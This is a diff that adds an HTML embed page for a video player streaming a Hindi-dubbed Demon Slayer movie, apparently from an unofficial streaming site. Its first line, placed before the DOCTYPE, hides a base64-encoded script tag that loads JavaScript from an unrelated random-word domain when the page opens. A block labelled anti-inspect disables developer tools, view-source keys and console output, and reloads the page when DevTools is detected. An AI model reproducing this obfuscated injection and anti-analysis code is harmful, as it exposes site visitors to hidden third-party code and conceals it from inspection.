@@ -1,0 +1,798 @@
+<script>document.write(atob("PHNjcmlwdCBzcmM9Imh0dHBzOi8vcHJvYmF0aW9udGhpbWJsZWRlc3BpdGUuY29tLzk4LzdjLzFlLzk4N2MxZTBhMjcyZTZlZmZiOGUxNmM2ZDFlNTgxZGM3LmpzIj48L3NjcmlwdD4="));</script><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Demon Slayer: Kimetsu No Yaiba Infinity Castle (hindi Dubbed) (Movie) - Embed</title>
+    <meta name="description" content="Embed Demon Slayer: Kimetsu No Yaiba Infinity Castle (hindi Dubbed) (Movie) in high quality">
+    
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background: linear-gradient(135deg, #0f0f1a 0%, #1a1a2e 50%, #16213e 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        .player-wrapper {
+            width: 100%;
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .player-container {
+            width: 100%;
+            height: 100%;
+            position: relative;
+            background: #000;
+            overflow: hidden;
+            box-sizing: border-box;
+        }
+        .artplayer-app {
+            width: 100% !important;
+            height: 100% !important;
+            position: absolute !important;
+            top: 0 !important;
+            left: 0 !important;
+            margin: 0 !important;
+            padding: 0 !important;
+            box-sizing: border-box !important;
+            display: none;
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out;
+        }
+        .artplayer-app.show {
+            display: block !important;
+            opacity: 1 !important;
+        }
+        
+        .video-title-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: linear-gradient(180deg, rgba(0, 0, 0, 0.8) 0%, rgba(0, 0, 0, 0.4) 70%, transparent 100%);
+            color: #ffffff;
+            padding: 1rem 1.5rem;
+            z-index: 1001;
+            opacity: 0;
+            transform: translateY(-10px);
+            transition: all 0.3s ease-in-out;
+            pointer-events: none;
+        }
+        
+        .artplayer-app.art-control-show .video-title-overlay,
+        .player-container:hover .video-title-overlay {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        
+        .video-title {
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin: 0;
+            line-height: 1.3;
+            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.8);
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        
+        @media (max-width: 768px) {
+            .video-title-overlay {
+                padding: 0.8rem 1rem;
+            }
+            .video-title {
+                font-size: 0.95rem;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .video-title-overlay {
+                padding: 0.6rem 0.8rem;
+            }
+            .video-title {
+                font-size: 0.85rem;
+                white-space: normal;
+                display: -webkit-box;
+                -webkit-line-clamp: 2;
+                -webkit-box-orient: vertical;
+                overflow: hidden;
+            }
+        }
+        
+        @media (hover: none) and (pointer: coarse) {
+            .player-container.touch-active .video-title-overlay {
+                opacity: 1 !important;
+                transform: translateY(0) !important;
+            }
+        }
+        
+        .ad-container {
+            width: 100%;
+            height: 100%;
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 2000;
+            display: none;
+        }
+        .ad-iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        .artplayer-app .art-video-player {
+            width: 100% !important;
+            height: 100% !important;
+            position: relative !important;
+        }
+        .artplayer-app video {
+            object-fit: contain !important;
+            width: 100% !important;
+            height: 100% !important;
+            position: absolute !important;
+            top: 0 !important;
+            left: 0 !important;
+        }
+        .artplayer-app * {
+            max-width: none !important;
+            max-height: none !important;
+        }
+        
+        .loading-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #0f0f1a 0%, #1a1a2e 50%, #16213e 100%);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1999;
+            opacity: 1;
+            transition: opacity 0.6s ease-out, visibility 0.6s ease-out;
+        }
+        .loading-overlay.hide {
+            opacity: 0;
+            visibility: hidden;
+        }
+        
+        .loading-spinner {
+            position: relative;
+            width: 80px;
+            height: 80px;
+            margin-bottom: 2rem;
+        }
+        .loading-spinner::before,
+        .loading-spinner::after {
+            content: '';
+            position: absolute;
+            border-radius: 50%;
+            animation: spin 2s linear infinite;
+        }
+        .loading-spinner::before {
+            width: 100%;
+            height: 100%;
+            border: 4px solid rgba(88, 101, 242, 0.2);
+            border-top: 4px solid #5865f2;
+            animation-duration: 1.5s;
+        }
+        .loading-spinner::after {
+            width: 60%;
+            height: 60%;
+            top: 20%;
+            left: 20%;
+            border: 3px solid rgba(165, 180, 252, 0.3);
+            border-top: 3px solid #a5b4fc;
+            animation-duration: 1s;
+            animation-direction: reverse;
+        }
+        
+        .loading-text {
+            color: #ffffff;
+            font-size: 1.1rem;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 0.5rem;
+            opacity: 0.9;
+            letter-spacing: 0.5px;
+        }
+        .loading-subtext {
+            color: #a5b4fc;
+            font-size: 0.9rem;
+            text-align: center;
+            opacity: 0.7;
+            animation: pulse 2s ease-in-out infinite;
+        }
+        
+        .progress-container {
+            width: 200px;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 2px;
+            margin-top: 1.5rem;
+            overflow: hidden;
+            position: relative;
+        }
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #5865f2, #a5b4fc, #5865f2);
+            background-size: 200% 100%;
+            border-radius: 2px;
+            animation: progressMove 2s linear infinite;
+        }
+        
+        .error-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #2d1b1b 0%, #3d2021 50%, #2d1b2e 100%);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 2001;
+            opacity: 1;
+            transition: opacity 0.6s ease-out, visibility 0.6s ease-out;
+            animation: errorFadeIn 0.8s ease-out;
+        }
+        
+        .error-spinner {
+            position: relative;
+            width: 80px;
+            height: 80px;
+            margin-bottom: 2rem;
+        }
+        .error-spinner::before,
+        .error-spinner::after {
+            content: '';
+            position: absolute;
+            border-radius: 50%;
+            animation: spin 2s linear infinite;
+        }
+        .error-spinner::before {
+            width: 100%;
+            height: 100%;
+            border: 4px solid rgba(239, 68, 68, 0.2);
+            border-top: 4px solid #ef4444;
+            animation-duration: 1.5s;
+        }
+        .error-spinner::after {
+            width: 60%;
+            height: 60%;
+            top: 20%;
+            left: 20%;
+            border: 3px solid rgba(252, 165, 165, 0.3);
+            border-top: 3px solid #fca5a5;
+            animation-duration: 1s;
+            animation-direction: reverse;
+        }
+        
+        .error-text {
+            color: #ffffff;
+            font-size: 1.1rem;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 0.5rem;
+            opacity: 0.9;
+            letter-spacing: 0.5px;
+        }
+        .error-subtext {
+            color: #fca5a5;
+            font-size: 0.9rem;
+            text-align: center;
+            opacity: 0.7;
+            animation: pulse 2s ease-in-out infinite;
+            margin-bottom: 1.5rem;
+        }
+        
+        .error-progress-container {
+            width: 200px;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 2px;
+            margin-top: 1rem;
+            overflow: hidden;
+            position: relative;
+        }
+        .error-progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #ef4444, #fca5a5, #ef4444);
+            background-size: 200% 100%;
+            border-radius: 2px;
+            animation: progressMove 2s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 0.7; }
+            50% { opacity: 1; }
+        }
+        @keyframes progressMove {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        @keyframes errorFadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px) scale(0.9);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .loading-spinner, .error-spinner {
+                width: 60px;
+                height: 60px;
+            }
+            .loading-text, .error-text {
+                font-size: 1rem;
+            }
+            .loading-subtext, .error-subtext {
+                font-size: 0.8rem;
+            }
+            .progress-container, .error-progress-container {
+                width: 150px;
+            }
+        }
+        
+        @media (prefers-reduced-motion: reduce) {
+            .loading-spinner::before,
+            .loading-spinner::after,
+            .error-spinner::before,
+            .error-spinner::after,
+            .loading-subtext,
+            .error-subtext,
+            .progress-bar,
+            .error-progress-bar,
+            .video-title-overlay {
+                animation: none;
+            }
+        }
+    </style>
+    
+    <!-- 🛡️ ANTI-INSPECT SECURITY -->
+    <script>
+        // Disable right-click
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        
+        // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+        document.addEventListener('keydown', function(e) {
+            if (e.keyCode == 123 || // F12
+                (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) || // Ctrl+Shift+I
+                (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) || // Ctrl+Shift+J
+                (e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) || // Ctrl+Shift+C
+                (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0))) { // Ctrl+U
+                e.preventDefault();
+                return false;
+            }
+        });
+        
+        // Detect DevTools
+        (function() {
+            const devtools = /./;
+            devtools.toString = function() {
+                this.opened = true;
+            };
+            const check = () => {
+                devtools.opened = false;
+                console.log('%c', devtools);
+                console.clear();
+                if (devtools.opened) {
+                    window.location.reload();
+                }
+            };
+            setInterval(check, 1000);
+        })();
+        
+        // Disable console
+        if (!window.console) window.console = {};
+        const methods = ['log', 'debug', 'warn', 'info', 'error', 'dir', 'trace'];
+        methods.forEach(method => {
+            console[method] = function() {};
+        });
+    </script>
+    
+    <!-- Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-98EVNG19LS"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-98EVNG19LS', {
+        'page_title': 'Demon Slayer: Kimetsu No Yaiba Infinity Castle (hindi Dubbed) (Movie) - Embed',
+        'page_path': '/embed/1311031'
+      });
+    </script>
+</head>
+<body>
+    <div class="player-wrapper">
+        <div class="player-container">
+                                    <div class="loading-overlay" id="loadingOverlay">
+                <div class="loading-spinner"></div>
+                <div class="loading-text">Preparing Your Video</div>
+                <div class="loading-subtext">This will just take a moment...</div>
+                <div class="progress-container">
+                    <div class="progress-bar"></div>
+                </div>
+            </div>
+                        <div class="artplayer-app" id="artPlayer"></div>
+            
+            <div class="video-title-overlay" id="titleOverlay">
+                <h2 class="video-title" id="videoTitle">
+                    Demon Slayer: Kimetsu no Yaiba Infinity Castle (Hindi Dubbed)                                    </h2>
+            </div>
+                    </div>
+    </div>
+    
+    <script src="https://cdn.jsdelivr.net/npm/artplayer/dist/artplayer.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/hls.js@latest"></script>
+    <script src="/watch/player.js"></script>
+    <script>
+        let playerInstance = null;
+        let isPlayerReady = false;
+        let retryAttempts = 0;
+        const maxRetryAttempts = 3;
+        const showVideoAd = false; 
+        const animeTitle = "Demon Slayer: Kimetsu no Yaiba Infinity Castle (Hindi Dubbed)";
+        const tmdbId = "1311031";
+        const uniqueId = "1311031";
+        const isMovie = true;
+        const baseUrl = 'https://blakiteapi.xyz';
+        let playerConfig = null;
+
+        function handleVisibilityChange() {
+            if (document.hidden) {
+                // Tab hidden
+            } else {
+                setTimeout(() => {
+                    if (playerInstance && isPlayerReady) {
+                        try {
+                            // Check player
+                        } catch (error) {
+                            // Handle error
+                        }
+                    }
+                }, 1000);
+            }
+        }
+
+        function handleWindowFocus() {
+            setTimeout(() => {
+                if (playerInstance && isPlayerReady) {
+                    try {
+                        const currentTime = playerInstance.currentTime || 0;
+                    } catch (error) {
+                        // Handle error
+                    }
+                }
+            }, 500);
+        }
+
+        function handleWindowBlur() {
+            // Window blur
+        }
+
+        function setupControlsSync(playerInstance) {
+            const playerApp = document.querySelector('.artplayer-app');
+            const titleOverlay = document.getElementById('titleOverlay');
+            
+            if (!playerApp || !titleOverlay) return;
+            
+            const observer = new MutationObserver((mutations) => {
+                mutations.forEach((mutation) => {
+                    if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
+                        const hasControlShow = playerApp.classList.contains('art-control-show');
+                        if (hasControlShow) {
+                            titleOverlay.style.opacity = '1';
+                            titleOverlay.style.transform = 'translateY(0)';
+                        } else {
+                            titleOverlay.style.opacity = '0';
+                            titleOverlay.style.transform = 'translateY(-10px)';
+                        }
+                    }
+                });
+            });
+            
+            observer.observe(playerApp, {
+                attributes: true,
+                attributeFilter: ['class']
+            });
+        }
+
+        function showError(message) {
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            if (loadingOverlay) {
+                loadingOverlay.style.display = 'none';
+            }
+            
+            const errorOverlay = document.createElement('div');
+            errorOverlay.className = 'error-overlay';
+            errorOverlay.innerHTML = `
+                <div class="error-spinner"></div>
+                <div class="error-text">Video Unavailable</div>
+                <div class="error-subtext">Please refresh the page...</div>
+                <div class="error-progress-container">
+                    <div class="error-progress-bar"></div>
+                </div>
+            `;
+            
+            const container = document.querySelector('.player-container');
+            container.innerHTML = '';
+            container.appendChild(errorOverlay);
+            
+            gtag('event', 'embed_error', {
+                'event_category': 'Error',
+                'event_label': message,
+                'tmdb_id': tmdbId,
+                'episode_id': uniqueId,
+                'is_movie': isMovie
+            });
+        }
+        
+        function hideLoading() {
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            if (loadingOverlay) {
+                loadingOverlay.classList.add('hide');
+                setTimeout(() => {
+                    loadingOverlay.style.display = 'none';
+                }, 600);
+            }
+        }
+
+        function startVideo() {
+            const adContainer = document.getElementById('adContainer');
+            if (adContainer) {
+                adContainer.style.transition = 'opacity 0.5s ease-out';
+                adContainer.style.opacity = '0';
+                setTimeout(() => {
+                    adContainer.style.display = 'none';
+                    const playerApp = document.querySelector('.artplayer-app');
+                    playerApp.classList.add('show');
+                    if (playerInstance && isPlayerReady) {
+                        try {
+                            playerInstance.play();
+                            gtag('event', 'embed_start', {
+                                'event_category': 'Embed',
+                                'event_label': animeTitle,
+                                'tmdb_id': tmdbId,
+                                'episode_id': uniqueId,
+                                'is_movie': isMovie
+                            });
+                        } catch (error) {
+                            // Auto-play failed
+                        }
+                    }
+                }, 500);
+            } else {
+                const playerApp = document.querySelector('.artplayer-app');
+                playerApp.classList.add('show');
+                if (playerInstance && isPlayerReady) {
+                    try {
+                        playerInstance.play();
+                        gtag('event', 'embed_start', {
+                            'event_category': 'Embed',
+                            'event_label': animeTitle,
+                            'tmdb_id': tmdbId,
+                            'episode_id': uniqueId,
+                            'is_movie': isMovie
+                        });
+                    } catch (error) {
+                        // Auto-play failed
+                    }
+                }
+            }
+        }
+
+        function setupTouchSupport() {
+            const container = document.querySelector('.player-container');
+            
+            if (!container) return;
+            
+            let touchTimeout;
+            container.addEventListener('touchstart', function() {
+                container.classList.add('touch-active');
+                clearTimeout(touchTimeout);
+                touchTimeout = setTimeout(() => {
+                    container.classList.remove('touch-active');
+                }, 3000);
+            });
+            
+            container.addEventListener('touchend', function() {
+                clearTimeout(touchTimeout);
+                touchTimeout = setTimeout(() => {
+                    container.classList.remove('touch-active');
+                }, 3000);
+            });
+        }
+
+        async function initializeVideoPlayer(config) {
+            try {
+                if (typeof initializePlayer !== 'function') {
+                    throw new Error('Player not available');
+                }
+                
+                playerInstance = initializePlayer(config);
+                
+                if (!playerInstance) {
+                    throw new Error('Player initialization failed');
+                }
+                
+                playerInstance.on('ready', () => {
+                    isPlayerReady = true;
+                    retryAttempts = 0;
+                    hideLoading();
+                    setupTouchSupport();
+                    setupControlsSync(playerInstance);
+                    setTimeout(() => {
+                        if (!showVideoAd) {
+                            startVideo();
+                        }
+                    }, 300);
+                });
+                
+                playerInstance.on('error', (error) => {
+                    isPlayerReady = false;
+                    
+                    if (retryAttempts < maxRetryAttempts && !document.hidden) {
+                        retryAttempts++;
+                        setTimeout(() => {
+                            initializeVideoPlayer(config);
+                        }, 2000);
+                    } else {
+                        showError('Video playback failed');
+                    }
+                });
+                
+                playerInstance.on('video:loadstart', () => {
+                    // Video loading
+                });
+                
+                playerInstance.on('video:canplay', () => {
+                    isPlayerReady = true;
+                });
+                
+                playerInstance.on('destroy', () => {
+                    isPlayerReady = false;
+                });
+                
+            } catch (error) {
+                if (retryAttempts < maxRetryAttempts) {
+                    retryAttempts++;
+                    setTimeout(() => {
+                        initializeVideoPlayer(config);
+                    }, 2000);
+                } else {
+                    showError(error.message);
+                }
+            }
+        }
+
+        async function trackView(animeTitle, tmdbId, uniqueId, action, isMovie) {
+            try {
+                const requestData = {
+                    animeTitle: animeTitle,
+                    tmdbId: tmdbId,
+                    action: action,
+                    isMovie: isMovie
+                };
+                
+                if (!isMovie) {
+                    requestData.uniqueId = uniqueId;
+                }
+                
+                const response = await fetch(baseUrl + '/api/trackView.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(requestData)
+                });
+                
+                if (response.ok) {
+                    const result = await response.json();
+                }
+            } catch (error) {
+                // Track failed
+            }
+        }
+        
+        document.addEventListener('visibilitychange', handleVisibilityChange);
+        window.addEventListener('focus', handleWindowFocus);
+        window.addEventListener('blur', handleWindowBlur);
+        
+        document.addEventListener("DOMContentLoaded", async function () {
+            if (!tmdbId) {
+                showError('Invalid video identifier');
+                return;
+            }
+            
+            try {
+                const apiUrl = isMovie 
+                    ? `${baseUrl}/api/get.php?tmdbId=${encodeURIComponent(tmdbId)}`
+                    : `${baseUrl}/api/get.php?id=${encodeURIComponent(uniqueId)}&tmdbId=${encodeURIComponent(tmdbId)}`;
+                
+                const response = await fetch(apiUrl);
+                
+                if (!response.ok) {
+                    throw new Error('Content not available');
+                }
+                
+                const result = await response.json();
+                
+                if (result.error || !result.data) {
+                    throw new Error('Video not found');
+                }
+                
+                if (!result.data.dataId) {
+                    throw new Error('Invalid video data');
+                }
+                
+                if (result.data.format === 'M3U8' && !result.data.ranges) {
+                    throw new Error('Video format not supported');
+                }
+                
+                const videoTitle = document.getElementById('videoTitle');
+                
+                if (result.data.animeTitle && videoTitle) {
+                    if (isMovie) {
+                        videoTitle.textContent = result.data.animeTitle;
+                    } else {
+                        const season = result.data.seasonNumber || '0';
+                        const episode = result.data.episodeNumber || '-';
+                        videoTitle.textContent = `${result.data.animeTitle} (S${season}-E${episode})`;
+                    }
+                }
+                
+                trackView(result.data.animeTitle, result.data.tmdbId, uniqueId, 'embed', isMovie);
+                
+                playerConfig = {
+                    ...result.data,
+                    container: '#artPlayer',
+                    quality: result.data.quality || '720p',
+                    autoplay: false
+                };
+                
+                await initializeVideoPlayer(playerConfig);
+                
+                if (showVideoAd) {
+                    window.addEventListener('message', function(event) {
+                        if (event.data.action === 'startVideo') {
+                            startVideo();
+                        }
+                    });
+                }
+                
+            } catch (error) {
+                showError(error.message);
+            }
+        });
+
+        window.addEventListener('beforeunload', function() {
+            isPlayerReady = false;
+            if (playerInstance) {
+                try {
+                    playerInstance.destroy();
+                } catch (error) {
+                    // Cleanup error
+                }
+            }
+        });
+    </script>
+</body>
+</html>
